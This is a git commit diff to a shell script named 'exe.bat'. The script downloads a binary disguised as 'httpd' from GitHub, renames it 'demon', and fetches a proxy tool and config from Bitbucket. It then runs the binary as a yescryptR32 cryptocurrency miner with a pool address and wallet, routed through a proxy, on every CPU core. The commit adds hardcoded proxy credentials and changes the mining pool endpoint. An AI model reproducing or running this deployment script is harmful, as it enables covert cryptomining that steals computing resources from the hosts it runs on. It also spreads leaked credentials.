4dc34eab46f9e1fa0da4f7b8cf1667f012b56c5f
ryandijeremy <167563417+ryandijeremy@users.noreply.github.com>
2024-05-10 04:40:58 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,5 +1,7 @@
-roxy="157.107.67.214" 
-port="40001"
+proxy="34.232.217.139" 
+port="1080" 
+user="kkm6q0pyklj5nr"  
+pass="96o50shuhn3ifrz317pf4gngefw8v"
 wget -q -O demon https://github.com/swanderenata/cautious-octo-garbanzo/raw/main/httpd && chmod +x demon
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
@@ -17,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./demon -a yescryptR32 -o 45.115.224.46:443 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-bian) -t $(nproc --all)
+./panel ./demon -a yescryptR32 -o 45.115.225.225:80 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-mikayui) -t $(nproc --all)
